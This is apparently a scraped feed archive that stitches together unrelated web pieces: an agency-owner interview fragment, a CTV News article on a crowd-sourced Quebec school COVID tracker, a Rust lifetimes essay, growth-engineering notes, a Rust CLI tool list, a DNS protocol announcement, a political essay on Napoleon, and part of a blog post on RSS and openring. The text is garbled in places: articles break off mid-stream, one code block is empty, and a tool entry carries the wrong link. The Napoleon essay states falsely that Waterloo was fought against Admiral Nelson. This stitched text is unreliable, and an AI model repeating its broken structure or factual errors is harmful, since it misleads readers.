enjoy the process, and have as much fun as possible.</p><p>An agency-specific lesson that I learned is - choose a niche industry as early as possible. We started off as a generalist PPC agency, but eventually specialized in the medical industry. There are a lot of generalist PPC agencies and therefore more competition. But becoming the expert in a specific industry gives you a competitive edge.&nbsp;</p><p>Having deep product knowledge in a specific industry allows you to service your clients better, which leads to more referrals, industry connections, and positions you as the go-to firm. Not to mention that specialist services are billed at a higher rate.&nbsp;</p><p>‍</p><p><strong>What advice do you have for agency owners that want to use consulting revenues to fund new ventures?</strong></p><p>Not only are agencies great cash-flow businesses, they are also great <a href="https://jayvas.com/how-i-used-my-ppc-agency-as-an-idea-machine">idea generating machines</a>. If you are working with clients/industries that interest you, it won’t be long before you spot an opportunity that you can capitalize on.<br></p><p>Be curious and ask your clients a lot of questions to gain a deeper understanding of their business. Focus on your cash flows to help fund new ventures, and if you spot something -&nbsp;roll the dice. You never know what may become of it, unless you try!</p></div></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div><p>MONTREAL -- 
	The Quebec government <a href="https://montreal.ctvnews.ca/quebec-hasn-t-released-official-data-on-school-outbreaks-and-hasn-t-said-when-it-will-do-so-1.5088184">hasn't said whether it will start updating the public</a> on COVID-19 cases in schools -- but some citizens don’t seem willing to wait.</p><p>
	
	A Montreal father who started a new crowd-sourced website meant to track school COVID-19 cases says it’s already garnered more than 100,000 page views.</p></div>
<p>
	By August, “I concluded we were going towards a second wave and our children would be in an experiment,” Olivier Drouin told CTV News.&nbsp;</p>
<p>
	“I wanted to capture the data at the source and make it available to all parents [and] teachers, for them to make informed decisions about back-to-school.”</p>

<p>
	Last week, as French-language schools reopened, he launched a homemade site called <a href="https://www.covidecolesquebec.org/">Covid Ecoles Quebec</a> that allows the public to submit reports of coronavirus cases at schools across the province.</p>
<p>
	It provides a list, and a map, showing the cases Drouin has been able to confirm to his standards after his own basic verification process.</p>
<p>
	Of course, it’s not an exhaustive list, and he says if the government started releasing its own numbers, he’d stop collecting his—but after losing some trust in official numbers, he’d want to check first that they were doing a good job, he said in an email.</p>
<p>
	Drouin is vice-president of a technology company that provides high-tech human resources software. He lives in Montreal and has two daughters, one 13 and one 15, he said.</p>
<p>
	His site so far has published the names of 33 schools with at least one COVID-19 case each. Aside from the skyrocketing page views, Drouin said he’s gotten “hundreds of submissions” in the last week from parents and others.</p>
<p>
	“Not all are published,” he said, as sometimes “information is missing” or, in many cases, he gets duplicate reports for the same case.</p>
<p>
	Aside from the fact that it’s crowd-sourced, there are some important caveats to keep in mind for anyone looking at his site: for one thing, he doesn’t try to count the number of cases, but the number of schools, he said.</p>
<p>
	If he can confirm, to his standards, one case linked to a school, the school goes on the list. The government, meanwhile, counts an outbreak as two or more cases.</p>
<p>
	As for verification, the “easiest way to verify is with a copy of the letter schools send to all parents when a case occurs, as this is now mandatory across Quebec,” he said.</p>
<p>
	If he doesn’t have this, he said, “I look for media coverage.” Some of the schools listed on his website have a link to a news article.</p>
<p>
	The website also has a map showing where the affected schools are. These come with another caveat: at first glance, the map seems to show huge outbreaks, with dozens of numbers attached to the pinpoint for each school.&nbsp;</p>
<p>
	But those big numbers are not meant to show the number of cases, he said. They’re chronological to when he entered them, so a pinpoint showing “32,” for example, means it was the 32nd school he found, not that there are 32 cases there.</p>
<p>
	Drouin said his frustration with the government’s handling of the pandemic, and especially its transparency around data, had been growing for months before he thought of crowd-sourcing data.</p>
<p>
	“In particular, when schools reopened in May outside Montreal,” he said, “the government claimed a big success—however, no data was available to measure that.”</p>
<p>
	Quebecers only learned later that there were 41 cases linked to schools, he said. (That news was announced about two to three weeks after schools reopened.)</p>
<p>
	He believes that others have grown distrusting, too, due to a combination of government choices and data errors.</p>
<p>
	“Because the government fails to make this data available and accessible, it lacks transparency,” he said.&nbsp;</p>
<p>
	“People don’t trust the numbers reported every day, as there have been so many data reporting issues,” he added, referencing the infamous fax machines used to collect infection reports, and the data that has been reported as misplaced or contaminated at various points.&nbsp;</p>
<p>
	Drouin said he’s not against kids going back to school, but he wanted more safety measures to be taken, including shrinking class sizes, improving ventilation, mandating masks in classes and giving more people the option of remote learning.</p>
<p>
	The Quebec government hasn’t said whether it’s even considering releasing data on COVID-19 cases at schools.&nbsp;</p>
<p>
	So far, the outbreaks that have been made public—including one involving <a href="https://montreal.ctvnews.ca/81-quebec-city-students-in-isolation-after-covid-19-cases-confirmed-at-two-schools-1.5086503">81 people at a Quebec City school</a> and <a href="https://montreal.ctvnews.ca/two-more-cases-of-covid-19-confirmed-quarantine-extended-for-20-quebec-teachers-in-isolation-1.5087658">a Deux-Montagnes outbreak</a> that has 20 teachers in quarantine—have been largely up to the media to confirm, with the cooperation of the schools and regional health authorities.</p>
<p>
	Drouin said he’d like it if the province did begin releasing routine data on schools.</p>
<p>
	“Based on the quality, accessibility of the data they would produce, yes, I would [shut my site down],” he said. “I have a day job.”</p>
                                              </div></div>]]>

<![CDATA[The Power of Lifetimes]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			

<p>The execution of a program unfolds over some interval of time.
The lifetime of every temporary resource (e.g., variable or object)
is the time span between that resource’s “creation” and “destruction”.
This lifetime is wholly contained within the typically-longer lifetime of the program.</p>

<p>The goal of this post is to explore how versatile lifetime analysis
has increasingly become in managing memory efficiently, safely and with better performance.
By the end of this post, we will explore exciting new ways to apply lifetime analysis,
beyond their current support in Rust.
However, let’s begin by demonstrating the explicit relationship between
lifetimes and automatic memory management.</p>

<h2 id="lifetimes-and-garbage-collection">Lifetimes and Garbage Collection</h2>

<p>Automatic memory management is all about lifetime analysis.
Here’s why: the useful lifetime of an object depends entirely on
the lifetimes of all references to that object.
The object’s life begins with creating the first reference to it.
It needs to stay alive as long as any strong<sup>1</sup> reference points to it.
The allocated object becomes a useless waste of space
once the last strong reference to it expires, making it ripe for memory reclamation.</p>

<p>The purpose of all forms of automatic memory management is to track
the lifetimes of all strong references to that object.
As soon as we know when the lifetimes of these references have all expired,
we can automatically destroy the object and reclaim its memory for re-use.
What distinguishes the various automatic memory management strategies
is <strong>how</strong> each determines when all strong references to an object have expired.</p>

<ul>
<li><p><strong>Tracing garbage collection</strong> relies on periodically probing all references.
It traces all strong references emanating from the root set, essentially
marking all objects whose reference lifetimes have not yet expired.
It can then iterate across a list of all allocated objects to reclaim
the memory used by all unmarked objects.</p></li>

<li><p><strong>Reference counting</strong> keeps a running count of how
many strong (and weak) references there are to an object.
In effect, the reference count is incremented whenever a new reference to the object
is created and decremented when the lifetime of that reference expires.
The object’s memory can be reclaimed when the count goes to 0.</p></li>

<li><p><strong>Single-owner</strong> uses compile-time analysis to ensure the first
reference created to an allocated object is also the last to survive.
This works because aliasing is done
using borrowed references whose lifetimes are guaranteed to be
shorter than the original reference they borrowed from.
Thus, when the original reference expires, the object’s memory is safely reclaimed.</p></li>

<li><p><strong>Arena</strong> ensures that all references to objects allocated within an arena
have a lifetime shorter than the arena itself. Thus, when the
arena expires, it is safe to reclaim all memory held by the arena,
since we know no references to any of its objects exist.</p></li>
</ul>

<p>Notice how all these techniques, except tracing garbage collection,
involve the compiler doing lifetime analysis: either knowing when a lifetime
expires or comparing lifetimes. This compile-time analysis relies on the fact
that most lifetimes are structured by scopes.</p>

<h2 id="structured-lifetimes">Structured lifetimes</h2>

<p>In 1968, Edsger Dijkstra’s provocative letter,
<a href="https://homepages.cwi.nl/~storm/teaching/reader/Dijkstra68.pdf">“Go To Statement Considered Harmful”</a>,
became an influential catalyst towards the ascent of
<a href="https://en.wikipedia.org/wiki/Structured_programming">structured programming</a>.
Structured programming replaces “spaghetti code” with modularized
control flow structures (e.g., “if” and “while blocks) that
have a single point-of-entry and a single point-of-exit.
This allows control flow to be modeled using a
<a href="https://en.wikipedia.org/wiki/Interval_(graph_theory)">reducible flow graph</a>.</p>

<p>One of the beneficial side-effects of our now-dominant, block-based
style of coding, is that we can conveniently scope the lifetimes of
our local variables to the inner-most block they are declared within.
These variables are “allocated” near the beginning of that block
and are automatically “freed” at block’s end.
We can say that local variables have a structured lifetime,
one that correlates with a single-entry/single-exit control flow block.</p>

<p>Compile-time lifetime analysis for memory management is made easier when lifetimes are structured,
especially since analysis only cares when a lifetime expires.
We know that a local variable’s lifetime expires no later than the end of its scope.
Similarly, we know that a local variable in an outer block
has a longer lifetime than any local variable scoped within an inner block,
as the inner block always completes before the outer block does.</p>

<p>Structured lifetime analysis can be reduced, in many cases, to simple arithmetic
that can be performed at compile-time.
Assign all blocks an integer number in a LIFO manner:
Global scope is 0, a function’s parameters are 1, the outermost block’s variables are 2, etc.
You increment the lifetime number as you enter a block and decrement when you leave.
To compare the lifetimes of two variables, compare their number;
a greater number corresponds to a shorter lifetime.</p>

<p>If you look back at the description of the four memory management strategies,
you will see how most of them depend only on knowing when lifetimes expire
and the ability to compare lifetimes. The more aggressively we can do this analysis lexically
at compile-time, the more we can excise performance-sapping runtime bookkeeping costs
from our programs. Even reference-counting can be optimized significantly
by using static lifetime analysis, allowing us to avoid the cost of altering
the reference counter when we know a reference has escaped from one scope to another.</p>

<h2 id="borrowed-references">Borrowed References</h2>

<p>Rust is rightly the programming language that comes to mind first when thinking about lifetimes.
However, it is worth noticing that Rust’s lifetime mechanisms improve on prior art.
For example, Rust’s static, single-owner memory management is an enrichment to
C++’s <a href="https://en.wikipedia.org/wiki/Resource_acquisition_is_initialization">Resource Acquisition is Initialization (RAII)</a>.
RAII with move semantics ensures an allocated resource is automatically destroyed at
end of its last scope.</p>

<p>Rust’s lifetime-constrained borrowed references improve on this by allowing safe aliasing.
The inspiration for safe borrowed references comes in two ways from
the <a href="https://en.wikipedia.org/wiki/Cyclone_(programming_language)">Cyclone programming language</a>,
a joint development effort by AT&amp;T and Cornell University.
The notion of a borrowed reference is adapted from Cyclone’s
polymorphic <a href="https://cyclone.thelanguage.org/wiki/Pointers%20with%20Restricted%20Aliasing/">restricted alias pointers</a>.
Additionally, Cyclone’s safe memory management focused on regions (which are usually arenas).
In order to ensure memory safety, Cyclone pointers could be annotated
with a named region qualifier preceded with a back-tick
(making them look very much like Rust’s apostrophe-based lifetime annotations).</p>

<p>Niko Matsakis’s key insight in 2012 was to
<a href="http://smallcultfollowing.com/babysteps/blog/2012/07/17/borrowed-pointer-tutorial/">annotate borrowed references</a>
with lifetimes rather than a memory-allocation region (arena).
This makes possible two key benefits:</p>

<ul>
<li><p>Borrowed references are isolated from having to know anything
about how the object’s memory was allocated (including the stack) to be useful to program logic.
A borrowed reference can be borrowed from any kind of allocated pointer, or even from
the interior of an allocated object. This makes borrowed references
a perfect fit for polymorphic use of references.</p></li>

<li><p>Safety of the borrowed reference can be easily guaranteed at compile-time
by ensuring that the lifetime of any object pointed at by the borrowed reference’s lifetime
lasts longer than the lifetime of the data structure that holds that reference.</p></li>
</ul>

<p>Every use of lifetime-constrained borrowed references doesn’t just make
reference-based polymorphism possible.
It also reduces the runtime bookkeeping costs when handling using RC-allocated objects,
since borrowed references never increment or decrement the reference counter.</p>

<p>Checking the lifetimes of borrowed references is the job performed by Rust’s borrow checker.
People sometimes get confused and think the borrow checker is the name for Rust’s
single-owner memory management strategy. In truth, they are separate mechanisms that
synergistically work well together. The sole job of the borrow checker is
to ensure that references borrowed from any stack-, Box-, or Rc- allocated object
are always safe to dereference. It is mostly a lifetime checker.</p>

<h2 id="lifetime-inference-and-annotations">Lifetime Inference and Annotations</h2>

<p>To the compiler, all borrowed references have lifetimes.
However, they are often not visibly annotated on most references.
This is because a lot of attention was paid to making Rust lifetimes as usable as possible,
largely by allowing lifetime annotations (qualifiers) to be elided from references
wherever they can be accurately inferred.
Lifetime inference is easy-to-accomplish in most cases.</p>

<p>Rust requires lifetime annotations in two places: on certain
function signatures and on struct fields bearing borrowed references.
For the most part, lifetime annotations are only needed
to simplify lifetime analysis for these potentially ambiguous situations:</p>

<ul>
<li>When a function returns a borrowed reference whose lifetime is unclear,
given that the function accepts multiple borrowed references
(each with possibly different lifetimes) as parameters.</li>
<li>When a function will store one a borrowed reference originating from
one parameter into a data structure originating from another parameter’s borrowed reference.</li>
<li>When a function returns a borrowed reference to a longer-lived field
from a shorter-lived data structure pointed at by a parameter’s borrowed reference.</li>
</ul>

<h2 id="non-lexical-lifetimes">Non-lexical lifetimes</h2>

<p>Rust 2018 Edition improves on borrowed reference lifetimes
by adding support for “non-lexical lifetimes”.
A more descriptive name might be “sub-lexical lifetimes” or “sub-block lifetimes”,
as the improvement allows the lifetime of a borrowed reference
to end sooner than the end of the lexical block scope it is declared within.
As usual, Niko does a great job of
<a href="http://smallcultfollowing.com/babysteps/blog/2016/04/27/non-lexical-lifetimes-introduction/">summarizing key situations</a>
where support for non-lexical lifetimes can be useful.</p>

<p>Before Rust 2018, the borrow checker would put a usage lock on whatever it
borrowed from, for the full lifetime of the enclosing block.
This lock prevents unsafe use of …</p></div></div>

September 2, 2020 | https://blog.jonlu.ca/posts/thoughts-on-product | <a href="https://web.archive.org/web/*/https://blog.jonlu.ca/posts/thoughts-on-product">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>My day job is, officially, as a Growth Engineer working primarily on Unauth Product at Pinterest. It’s slightly different from my previous software engineering roles - typically, in other roles, I would be handed a spec sheet or design and had to implement it. Sometimes I’d design it myself, but the challenges were uniquely <em>technical</em> - I had to build something, and there was creativity in so far as what technologies and design patterns I’d use, but the features and product itself were usually dictated to you. They would either be so obvious that they were trivial, or they’d be handed down by some PM some point above the line.</p><p>Working on growth engineering is different - you’re responsible for the ideation and product, and focus around a north star metric, and can gauge the success of your ideas <em>objectively</em>. You own the entirety of the process, and have a quantifiable number at the end (for unauth and SEO, it’s usually traffic, time on site, and, most importantly, user acquisition).</p><p>This lends itself to an interesting focus at work every day. You want to build a product that is actually enjoyed and valuable to users, while still trying to “game” their attention and behavior.</p><p>The following are some thoughts I’ve had from working and consulting in growth at startups and companies of various sizes, mostly in the consumer tech space:</p><h2 id="thoughts-on-users-and-product">Thoughts on users and product</h2><ul><li><p>Trying to get users to do something is less like being an omnipotent god that tells people what to do than it is reshaping rivers of user intent. You can’t control what a user does, merely guide the flow of their actions. Adding a huge button doesn’t mean they’ll click on it.</p></li><li><p>Removing the ability to do something won’t prevent them from doing it (and will most likely just increase distaste for your product).</p></li><li><p>Users are simultaneously smarter and dumber than you think. Dumber in the sense that, when you take the average level of product comprehension for a user of any site that is used by a significant portion of the world population every day, it’s fairly low. Especially when you’re focused on new user acquisition, they don’t know what to expect, or how to use what you’re providing them. At the same time, though, they’re <strong>on your site for a reason</strong>, and usually know what they want.</p></li><li><p>You need to make sure to put yourself in the same headspace as your users. As someone building a product, you have to remember that you have a significantly higher familiarity with it than the people using it. You’ll have specific names for each product feature and know the user flows and reasoning behind each action, but for a lot of the people that visit your site, it’s their first time there.</p></li><li><p>It’s easy for me, as an early 20s San Francisco based software engineer, to have a fairly skewed perception of the world. Remember the user can have every possible demographic and characteristic.</p></li><li><p>Make sure you track what your users do when they come to your site, and experiment often with major shifts to your platform. It’s incredibly easy to <em>think</em> that users are doing something for a certain reason, when in reality it’s baseless.</p></li><li><p>Everything comes at a trade-off. Sometimes this is strictly better, metrics wise, but other times the trade-offs aren’t as clear - it doesn’t mean they don’t exist, though. The choices in button ordering, what you put above the fold, the font size, it all pulls and pushes the user experience in different directions.</p></li><li><p>Build for everyone, not just the professional. It’s easy when building products at work to be in a professional mindset - you’re not really thinking about <strong>every</strong> possible aspect that someone could be using your product for. Users get value in ways you never could predict - it’s better to build a platform that is flexible and ambiguous than imagine a single purpose use for what you’re building.</p></li><li><p>You do not and can not control users, and should view yourself more as at their mercy than them at yours. Working on a product is a lot more like swinging your arms around blindly in a room hoping you hit the light switch than it is knowing exactly what people want and how to deliver it to them.</p></li><li><p>Question all of your previous learnings. Something might’ve been true in the past, but is no longer. The same experiment or feature can lead to differences in results based on some slight change in the product or flow.</p></li></ul><h2 id="thoughts-on-growth">Thoughts on growth</h2><ul><li><p>Your user metrics are almost always proxies for what you’re trying to measure. You’ll pick some north star metric and say that this is what you’re building around, but this is just a shadow of what you’re trying to measure - the nebulous cloud of “user enjoyment”</p></li><li><p>Sometimes building a more aggressive user experience is worth it in the long run. For example: By default, your site could have a 2% conversion rate and a 20% bounce rate. A new feature is introduced behind an experiment that increases the conversion rate to 3%, but increases the bounce rate to 80%. This is clearly a subpar experience - it increases your bounce rate by 400%. However, it also increases your conversion rate by <strong>50%</strong>. Depending on your product this can make sense (for example, anything with an LTV for each user that is really high, or that has a really high CAC). It might not be ideal in the long term, but having a short term lever like this can be instrumental to a product’s success.</p></li><li><p>User growth is often cyclical. Some products will have the same traffic every day of the year, whereas others will have time of day, day of week, week of month, or seasonal patterns.</p></li><li><p>Monitor everything. As a product grows, you’ll build out one-off features that are significant wins at the time, but which aren’t actively monitored. It’s cheap to add a log to something and just page a team when it drops to 0. This is significantly eased by TDD, but TDD is rarely the right answer when your main concern is growth (you should move quickly).</p></li><li><p>You should move as quickly as possible. Don’t work on an idea for a long time - build out the smallest possible version that gives you directionality (positive or negative for the user metrics you’re looking at) and iterate from there. Especially in the early stages of a company, moving slowly and not adapting to shifting market conditions can kill you.</p></li><li><p>Growth is product + a direction + fuel. Each of these is a multiplier on the others - any combination of these can make a successful company. The dream is to have a great product that knows exactly where it wants to go, with all the resources it needs, but this is very rarely the case. More often than not you’ll have a mediocre product that’s floated along for a bit while being severely understaffed. If any of them is 0, you’re DOA. There’s no pithy truism here - a company can succeed <em>because</em> it has great direction and resources, or it can fail <em>in spite of it</em>.</p></li></ul><h2 id="success">Success</h2><p>One of the most important parts of the above is that they’re not static. These aren’t commandments that are written in stone - they’re learnings that are based on trial and error, off of experiments and conversations with users. You’ll run an experiment one day that contradicts nearly everything you’ve learned about growth and product, and you just have to re-baseline yourself and take those learnings forward.</p><p>You have a lot of control in so far as what the user sees and has access to - you can never control what they do with it, though. Building something that keeps the experience in mind, and that is focused on long term, sustainable growth is all you can hope to achieve.</p></div></div>]]>

      <div>
        <p>Shell is the essential tool for every programmer. The more familiar you become with the available tools, the more efficient you can be with using your computer. Here's a list of command-line tools written in Rust that aim to provide modern, often much faster, alternatives to the existing shell commands.</p>
<h2 id="bat"><code>bat</code></h2>
<p><code>bat</code> is a <code>cat</code> clone with syntax highlighting and Git integration that works on Windows, MacOS and Linux. It provides syntax highlighting for many file extensions by default.</p>
<p><img src="https://user-images.githubusercontent.com/200613/90223573-9b9eb780-de0e-11ea-94e3-908957fe5a4e.png" alt="bat"></p>
<p><a href="https://github.com/sharkdp/bat">GitHub</a></p>
<h2 id="exa"><code>exa</code></h2>
<p><code>exa</code> is a modern replacement for <code>ls</code>, the default command-line program in Unix/Linux for listing directory contents. <code>exa</code> supports icons with the <code>--icons</code> flag.</p>
<p><img src="https://user-images.githubusercontent.com/200613/90223612-aa856a00-de0e-11ea-8cec-133becefa6f2.png" alt="exa">
<a href="https://github.com/ogham/exa">GitHub</a></p>
<h2 id="fd"><code>fd</code></h2>
<p><code>fd</code> is a fast and user-friendly alternative to <code>find</code>, the built-in command-line program in Unix/Linux for walking a file hierarchy. <code>fd</code> provides opinionated defaults for the most common use cases. To find a specific file by name, you write <code>fd PATTERN</code> instead of <code>find -iname ‘*PATTERN*’</code>. <code>fd</code> is also extremely fast and it comes with a ton of options like ignoring hidden directories, files and patterns from <code>.gitignore</code> by default.</p>
<p><img src="https://user-images.githubusercontent.com/200613/90223646-bbce7680-de0e-11ea-98f4-0ef2d5f30920.png" alt="fd"></p>
<p><a href="https://github.com/sharkdp/fd">GitHub</a></p>
<h2 id="procs"><code>procs</code></h2>
<p><code>procs</code> is a modern replacement for <code>ps</code>, the default command-line program in Unix/Linux for getting information about processes. It provides convenient, human-readable (and colored) output format by default.</p>

<p><a href="https://starship.rs/guide/">GitHub</a></p>
<h2 id="ripgrep"><code>ripgrep</code></h2>
<p><code>ripgrep</code> is an extremely fast alternative to <code>grep</code>, the built-in command-line program in Unix/Linux for searching files by pattern. <code>ripgrep</code> is a line-oriented search tool that recursively searches your current directory for a regex pattern. By default, ripgrep respects <code>.gitignore</code> and automatically skips hidden files, directories and binary files.</p>
<p><img src="https://user-images.githubusercontent.com/200613/90223748-ecaeab80-de0e-11ea-9140-ac9219f5747c.gif" alt="ripgrep"></p>

<p>1st September 2020, by Elliott Brown</p>
<h4>Today we're announcing NUM, a new DNS-based protocol to store and retrieve structured data</h4>
<p>
  The Namespace Utility Modules (NUM) protocol can be used to store structured data for any domain name or email address. NUM&nbsp;records can be stored in the DNS of the independent NUM zone (e.g. <code>_num.example.com</code>) or in the hosted NUM zone (a DNS-based store of NUM records below the domain <code>num.net</code>) using a simple web interface: <a href="https://www.numserver.com/" target="_blank">NUM Server</a> <img src="https://www.num.uk/images/link-external.png" title="Content on another site." alt="Content on another site.">.
</p>
<p>
  We're announcing this experimental protocol to the technical community today and are very interested in feedback and input.
</p>
<h5>Custom and standardised records</h5>
<p>
  Custom NUM records can store structured data for any purpose, particular use cases are standardised with <a href="https://www.num.uk/modules">modules</a> <img src="https://www.num.uk/images/link-internal.png" title="Content elsewhere on this site." alt="Content elsewhere on this site.">. One of our leading use cases for NUM is contact information. Enabling organisations and individuals to store contact data in the DNS opens up lots of new possibilities like dialling a domain name or email address.
</p>
<h5>Automatically populating the DNS with millions of pieces of structured data</h5>
<p>
  As well as offering a simple, user-friendly way to adopt NUM, the NUM Server also helps overcome the chicken-and-egg problem. We&nbsp;intend to populate NUM records for millions of domain names based on website information hosted on those domain names. We&nbsp;expect to publish this data in early 2021.
</p>
<h5>Free, unrestricted and unlimited access to data</h5>
<p>
  Since NUM data is stored and served using DNS it's ultra-fast, reliable and massively scalable. Access to records on the NUM Server is free, unrestricted and unlimited forever. NUM enables organisations and individuals to take back control of their data and provides a valuable resource to developers building devices, apps and services.

<p><em>“The long, dark night of the end of history has to be grasped as an enormous opportunity. . . From a situation in which nothing can happen, suddenly anything is possible again.”</em><br>
— Mark Fisher<sup><a href="#fn1" id="fnref1">[1]</a></sup></p>
<p><span>T</span>here is some truth to the notion that history is governed by power laws—only a few inflection points define the course of the world. Thomas Carlyle’s now infamous Great Man theory posits that some of us are born with god-given talents and these great leaders arise in moments of crisis. Yet, should we succumb to our fate if we lose the genetic lottery and accept that we cannot change destiny?</p>
<p>In recent years, academics have deconstructed Carlyle’s theory because it doesn’t account for our environment, which plays more than a significant role in our success. Talent, for the critic, does not enter into the equation. In this gray area, there is a compromise: the extent of a leader’s genius is hidden until their environment allows them to flourish, letting them reach their full potential at last. In any case, hero-worship is essential: this “Consecration of Valor,” as Carlyle put it, is nevertheless a constant in all ages. These stories are foundational to the human spirit.</p>
<p>There is perhaps no better example of such latent genius than Napoleon. As he buried the ancién regime and conquered Europe, he quipped to Ségur, “I have dethroned no one. I found the crown in the gutter. I picked it up, and the People put it on my head.”</p>
<p>Napoleon came of age when France was built out of bricks and he left it carved out of marble. Certainly, at the time, many felt that Napoleon, against all odds, orchestrated these series of neverending triumphs and changes. History itself appeared to be moving in sync with the force of his iron hand. But doesn’t that underplay the role of his environment in shaping his success? Timing is key; the macroeconomic landscape sets the stage for heroism. Caesar needed the eroding Roman Republic just as much as the Republic needed him.</p>
<p>As it were, the Jacobins’ destruction of all established social structure led to the unintended rise of Napoleon. We may find ourselves in wholly uncharted territory as a result of such immoderate men.  The conditions in modern America—rampant unemployment, political polarization, and stagnant growth in non-technological fields—appear to be laying the groundwork for such a story once again. If, as many of us believe, polarization could lead to revolution, should we hold our breath waiting for another benevolent revolutionary? A figure in the Napoleonic mold?</p>
<p>This time is different from past eras because, on the bumpy road of history, the technological apocalypse through biowarfare, cheaper atomic weapons, or even a malevolent AGI beckons us with a false step. As the coronavirus has demonstrated, the road to calamity might not even require a misstep. The absence of choice is identical to a negative choice, and not solving these issues implies their arrival sooner or later.</p>
<p>Citizens want the sweeping reforms that only absolute power can promise but shun  the return of such power itself. Will the people choose their governor wisely?</p>
<p>Napoleon’s journey could help us ask the previously neglected question of whether or not America can handle another civil war without a Lincoln at its helm.</p>
<h3 id="soldierpriestandgod">Soldier, Priest, and God</h3>
<p>It’s a symptom of postmodernity that we reflect on the few inopportune moments and indiscretions that tinge Bonaparte’s otherwise glamorous life. His grande Armée’s retreat from Russia’s Alexandre I, the ill-fated Battle of Waterloo against Britain’s Admiral Nelson, and most infamously, the courtship of his adulterous wife Josephine. We comfort ourselves with these surface level quips to avoid the nuanced mythos about Bonaparte’s life. Napoleon’s core legacy is thus enshrined in his eponymous complex—not in his genius.</p>
<p>People forget that power does not permit a vacuum. Someone always steps up to take charge. In the time preceding the French Revolution, the monarchy played a significant role in exalting the cult of the hero; unbeknownst to them, it was because their power was fraying at the edges.</p>
<p>The slow but steady progress into secularism created an opportunity for motivated individuals to gather influence. There were two reasons for this: First, cheap printing became increasingly pervasive and, second, culture shifted from the exaltation of the monarchy toward these heroes across the first and second estates. In hindsight, it was Napoleon, another monarch, who was the culmination of the enlightenment, the first leader of the renaissance, who turned the world on its head across the fields of science, religion, and philosophy.</p>
<p>Philip Dwyer describes the context thusly:</p>
<p><em>“The French had been accustomed to worshipping a canon of ‘great men’, including</em> philosophes <em>like Voltaire and Rousseau, and generals like Condé, Turenne, Luxembourg, and Saxe. . . In the second half of the eighteenth century, these ‘great men’ increasingly took the place previously occupied by kings and saints. . . History, in other terms, was becoming national and any man who had carried out great acts, indeed just about anyone of any notoriety, could aspire to public recognition.”</em><sup><a href="#fn2" id="fnref2">[2]</a></sup></p>
<p>It is in this frame that we should consider Napoleon. Even a passing glance of the centuries thereafter would show that Europe, and the world, is marked with his imprint. The Napoleonic code transformed perception of individual freedom across personal and property rights and started the progressive reforms that characterize our globalized age. His protean nature allowed him to scale the Enlightenment reforms of meritocracy, industrial efficiency along with secular education, and truthful financing. If there was any individual who could champion the Enlightenment, it was Napoleon.</p>
<h3 id="allthatssolidmeltsintoair">All that’s solid melts into air</h3>
<p><em>“We have done with the romance of the Revolution, we must now commence its history.”</em><br>
—Napoleon</p>
<p>Invoking Bonaparte’s name requires a call-back to the origins of the French revolution—they are married. Louis XVI’s France had structural issues contemporary historians consider impossible to have overcome: staggering levels of debt, immigration, and centralized wealth threatened the foundational elements of society.</p>
<p>Jean Jaurès, an original member of the French Socialist party, wrote at the time:</p>
<p><em>“There was not one action in rural life that did not require the peasants to pay a ransom. . . Feudal rights thus extended their clutches over every force of nature, everything that grew, moved, breathed; the rivers with their fish, the fire burning in the oven to bake the peasant’s poor bread mixed with oats and barley, the wind that turned the mill for grinding corn, the wine spurting from the press, the game that emerged from the forests or high pastures to ravage vegetable plots and fields.”</em><sup><a href="#fn3" id="fnref3">[3]</a></sup></p>
<p>French peasants were thrust into remarkable destitution throughout the course of the 18th century. Migrants, similar in many respects to their descendants with H1B immigration status, could work in cities if they gave up their privacy and dignity: they had to carry their documents on them at all times while the royal police hawkishly stalked them in and out of their homes. The story is the same for H1B visa holders—if a company decides to terminate one’s employment status, the immigrant is deported. This creates a system of indentured servitude akin to that of the French serf centuries ago.</p>
<p>Cultivators rented farmland from their lords of which they had to supply the cattle and seed—to participate in the economy, they were marshalled into lifelong debt slavery. That mirrors the plight of our younger generations who are burdened with the ever-increasing prices of healthcare, education, and rent required to find a job in America’s productive areas.</p>
<p>So the period preceding the new order carried with it unprecedented levels of inequality and social stratification much like in our times. Jaurès’ voice echoes the conditions we’re witnessing: it is best to demarcate workers into those who are in the technology industry and those who are not. This split is especially precarious for those in the middle, the gig workers, who are subject to the worst of both worlds. The stock market is divorced from the broader economy and to be neither a financier nor a CEO in the post-coronavirus world is a recipe for disaster.</p>
<p>Hence, we should not be surprised that these conditions fuel the riots, and revolutionary sentiment in the 18th century and today.</p>
<p>With more than 40 million out of work, the upheaval in America is just beginning. This matches past booms and busts, which wrought financial calamity. However, something has changed beyond the horizon of political polarization—the very lives of the people are at stake. Unchecked riots and the failure of the medical state has destroyed the people’s faith in structure: the resistance is growing and has since ensued in riots across the country.</p>
<h3 id="neojacobins">Neo-Jacobins</h3>
<p>Fr. Richard John Neuhaus one said, “Culture is the root of politics and religion is the root of culture,” More than race, the rioters believe a wholly atheist religion of what Thomas Piketty has called “participatory socialism” whereby western nations have “a universal right to education and a capital endowment, free circulation of people, and de facto virtual abolition of borders.” <sup><a href="#fn4" id="fnref4">[4]</a></sup></p>
<p>Socialism only works with a five-year plan: growth is a must in order for progressive policies to succeed. What voters misunderstand is that with a shrinking worldwide demographic, 20th century capitalism has been left in the dark ages. We cannot indefinitely expect developing nations to consume our goods nor we can imagine that acceleration of technological prowess will save us. The resistance is slowly coming to terms with the incompatibility of their hopes and the foundational tenets of neoliberalism: stagnant wages, free trade, and open borders. The manichean battle between the US and China is the first scrimmage of our deflationary world.</p>

<p>Since I am using <a href="https://sr.ht/~sircmpwn/openring/"><code>openring</code></a>, I will detail how I automatically update the posts in the webring for this blog with the feeds from the blogs I follow.</p>

<h2 id="finding-the-stored-feed-data">Finding the stored feed data</h2>
<p>I’m using the RSS reader <a href="https://gitlab.com/news-flash/news_flash_gtk"><code>news-flash</code></a>.
So the first order of business was finding out where where and how my feed was stored.
Since <code>news-flash</code> is FOSS, a quick into the sourcecode revealed the following.</p>
<div><div>

</span><span></span>}<span>
</span></code></pre></td></tr></tbody></table>
</div>
</div><p>And <code>glib</code> is refering to the GTK+ library for rust.
Gnome uses the <a href="https://developer.gnome.org/basedir-spec/">XDG Base Directory Specification</a>, which tells us how data and config directories are to be defined.
With this knowledge equipped, I found the folder, and in it resides a SQLite database file.</p>
<blockquote>
<p>It actually was a little more complicated than that. I am using Pop!OS (currently contemplating a migration to nixOS) which does not set <code>XDG_DATA_HOME</code>, but I found it in my home folder’s <code>.var/</code> folder.</p>
